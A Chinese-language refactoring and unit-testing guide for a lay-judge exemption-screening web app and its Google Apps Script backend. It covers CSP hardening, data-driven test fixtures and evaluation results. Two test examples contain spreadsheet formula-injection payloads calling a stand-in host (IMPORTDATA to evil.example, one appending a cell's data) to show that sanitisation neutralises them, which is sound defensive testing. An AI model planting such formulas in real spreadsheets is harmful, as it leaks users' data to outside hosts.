# 重構建議與單元測試

## 一、本次已完成的重構

| # | 重構 | 為什麼 |
|---|---|---|
| ✅ 1 | 免除初篩抽成 `lib/screening.js`，court.html 與 Apps Script 共用 | 原本三份規則各改各的，結果會不一致（審查 M-5、A-1） |
| ✅ 2 | `scripts/build-gs.mjs` 自動把 `lib/screening.js` + `apps-script/main.gs` 合併成 `apps-script/Code.gs` | Apps Script 沒有 import，但仍要「只貼一個檔案」；測試會檢查兩者有沒有同步 |
| ✅ 3 | court.html 的程式移到 `court.js` | 才能用 CSP `script-src 'self'` 擋掉內嵌程式（M-2） |
| ✅ 4 | 問答比對抽成 `lib/qa-search.js` | 原本只能開瀏覽器手動試；現在口語問法有回歸測試 |
| ✅ 5 | 一列資料改用物件 `{ts, id, reply, reasons, note}`，不再用 `r[1]`、`r[4]` | 看得懂、欄位順序改了不會默默讀錯 |
| ✅ 6 | Apps Script 用標題找欄位、加鎖、加時限、逐欄寫入 | M-3、M-4、M-6 |
| ✅ 7 | 刪掉沒用到的 `replyModal()`，`<title>` 移回 `<head>` | 清理 |

## 二、建議接著做的重構（依投資報酬排序）

### R-1 把 `index.html` 的劇本改成資料（建議做）

現在 `story()` 是一長串 `await say(…)`、`await ask(…)`，劇本和程式混在一起，改一句台詞要在 700 行裡找。建議：

```js
// story.js：劇本只是資料
const STORY = [
  { stage: 1, scene: 'home', place: '你家客廳', hint: '去一天有多少錢？', steps: [
    { say: ['旁白', '某天下午，你在信箱裡發現一封法院寄來的信。'] },
    { say: ['你', '法院？我又沒做什麼……'] },
    { modal: 'notice' },
    { ask: ['你', '看起來好麻煩……', ['可以不去嗎？', '先看看到底要做什麼']],
      then: { 0: [{ say: ['手機小幫手', '當國民法官是法定義務……（Q3607）'] }] } },
  ]},
  // …
];
// 引擎只負責照著跑
async function run(steps) { for (const s of steps) { /* say / ask / modal / scene … */ } }
```

好處：評審或法律系同學可以直接改台詞、加出處；可以寫測試檢查「每一句法律說明都有 Q 編號出處」。

### R-2 把問答資料庫 `KB` 移到 `data/faq.json`（建議做）

`KB` 目前是一個 30 KB 的字串，內嵌在 HTML，和 `prompts/PartyRock問答提示詞.txt` 是兩份副本。改成 JSON 後：

- `index.html` 用 `fetch('data/faq.json')` 載入
- 一支小腳本從 JSON 產生 PartyRock 提示詞，不用手動同步
- 測試可以檢查每題都有出處、題號不重複（目前已用 `tests/helpers.js` 從 HTML 擷取來測）

### R-3 index.html 也加 CSP（中等）

court.html 已經有 CSP。index.html 因為從 jsDelivr 載入 transformers.js、模型從 Hugging Face 下載（會轉址到多個網域），要先列出所有網域再加，否則語意搜尋會壞掉。做法：先用 `Content-Security-Policy-Report-Only` 觀察一週。

### R-4 自架 transformers.js 與模型（正式版）

把 `@huggingface/transformers@3.0.2` 與 `bge-small-zh-v1.5`（q8，約 24 MB）放在自己的網站，移除對 jsDelivr、Hugging Face 的依賴（審查 L-6）。原型階段不必做。

### R-5 `window.claude` 路徑另外處理（低）

AI 模式和模擬評議室只有在 Claude 環境裡才會啟用，GitHub Pages 上永遠走語意搜尋。可以把這段移到 `lib/claude-bridge.js`，並在畫面上隱藏不會用到的評議室入口，避免評審以為功能壞了。

### R-6 TAIDE 介面（正式版）

`callLLM_()` 已經是唯一呼叫模型的地方。正式版建議改成：

```js
function callLLM_(prompt, json) {
  const backend = props.getProperty('LLM_BACKEND') || 'gemini'; // gemini | taide
  return backend === 'taide' ? callTaide_(prompt, json) : callGemini_(prompt, json);
}
```

`checkAI()` 的白名單檢查對任何模型都適用，不用改。

---

## 三、單元測試

不需要安裝任何套件，只要 Node.js 20 以上：

```bash
npm test          # 85 項單元測試
npm run eval      # 規則層準確度評估
npm run check     # 檢查 Code.gs 有沒有同步＋跑測試（push 前跑這個）
```

GitHub Actions（`.github/workflows/test.yml`）每次 push 和開 PR 都會自動跑 `npm run check`、`npm run eval`，以及另一個 job 跑瀏覽器測試（`npm run test:browser`）。

瀏覽器測試要先裝 Playwright（只有這份測試需要，所以不寫進 `package.json`）：

```bash
npm i --no-save playwright@1.63.0 && npx playwright install chromium
npm run test:browser   # 10 項，約 15 秒
```

### 測試檔案

| 檔案 | 測什麼 | 範例 |
|---|---|---|
| `tests/screening.test.js` | 規則、AI 回傳檢查、公式注入、CSV | 25 筆標註案例逐筆比對；「AI 不能單獨決定不需人工確認」 |
| `tests/qa-search.test.js` | 問答比對 | 「去一天有多少錢？」要找到 Q3637 |
| `tests/apps-script.test.js` | Apps Script 整體流程 | 用假的 `SpreadsheetApp` 在 Node 裡跑 `onFormSubmit`、`doGet`、`rebuildDashboard` |
| `tests/build.test.js` | `Code.gs` 是否同步、HTML 引用的檔案是否存在 | |
| `tests/eval-rules.js` | 準確度評估（不是 pass/fail 測試） | 覆蓋率、正確率、誤放行數 |
| `tests/browser/ui.test.js` | 用真的 Chromium 操作網頁（單元測試考不到的畫面問題） | 民眾端手機與筆電尺寸都測（有人掃不了 QR code，會用電腦輸入網址）。手機尺寸：勾選框是淺色樣式、提醒文字不小於 13px、選項不矮於 40px、印章不蓋住標題、問答回答從開頭顯示、從頭玩到結尾沒有錯誤；電腦尺寸：法院端示範資料、附件勾選、摘要 |

### 範例 1：純函式（最簡單）

```js
const test = require('node:test');
const assert = require('node:assert/strict');
const S = require('../lib/screening.js');

test('sanitizeCell：防止寫進試算表的值被當成公式', () => {
  assert.equal(S.sanitizeCell('=IMPORTDATA("https://evil.example/")'), '\'=IMPORTDATA("https://evil.example/")');
  assert.equal(S.sanitizeCell('一般文字'), '一般文字');
});
```

### 範例 2：資料驅動（加案例不用寫程式）

規則層的測試讀 `tests/fixtures/exemptions.json`。發現誤判時，**先把那個案例加進 JSON**（`expect` 寫正確答案），確認測試會失敗，再改 `lib/screening.js` 讓它通過：

```json
{ "id": "X001", "tag": "邊界：家人的年齡", "reasons": "要照顧家人或養育小孩，執行職務有困難",
  "note": "我要照顧 85 歲的母親，她失智需要人陪。", "expect": { "by": "ai" }, "gold": "得拒絕" }
```

- `expect.by`：`rule`＝規則層應該自己判；`ai`＝應該交給 AI
- `expect.類型`、`expect.需人工確認`：規則判的話，結果應該是什麼
- `gold`：依法條人工標註的正確類型（給準確度評估用）

### 範例 3：模擬 Google 服務（測 Apps Script）

Apps Script 只能在 Google 上跑，但可以把 `SpreadsheetApp`、`UrlFetchApp` 換成記憶體裡的假物件，用 Node 的 `vm` 執行 `Code.gs`：

```js
const env = makeEnv({
  rows: [['t', 'C023', '申請免除', '有重大疾病', '上個月剛做完心臟手術。']],
  props: { GEMINI_API_KEY: 'k' },
  llm: [geminiSays({ '對應事由': '=IMPORTDATA("https://evil.example/?"&E2)', '類型': '得拒絕', 'AI建議': '可能符合', '需人工確認': '否' })],
});
env.onFormSubmit({ range: { getSheet: () => env.sheet, getRow: () => 2 } });
assert.ok(aiOf(env, 2)['AI 對應事由'].startsWith("'="));
```

完整的假物件在 `tests/apps-script.test.js` 開頭，約 60 行。

### 目前的評估結果

```
標註案例：44 筆
規則層覆蓋率：13/44（29.5%），其餘交給 AI
規則層類型正確率：13/13（100.0%）
誤放行（規則說不需人工確認，但類型錯）：0 筆
```

第二輪審查前的規則（黑名單版）在同一份 44 筆資料上：判 24 筆、錯 12 筆、誤放行 11 筆。
再之前（PR #3 之前）在原本 25 筆上：判 13 筆、對 9 筆（69%）。

E、P 開頭的 19 筆是第二輪才加的，規則也照著它們改過，所以這個 100% 仍是「考自己出的題目」。
下一步：請法律背景的成員另外寫 50～100 筆**不拿來調規則**的說法，只用來評估。

AI 層：`GEMINI_API_KEY=… node tests/eval-rules.js --ai`（只用虛構資料）。建議 Demo 前跑一次，把正確率寫進提案。
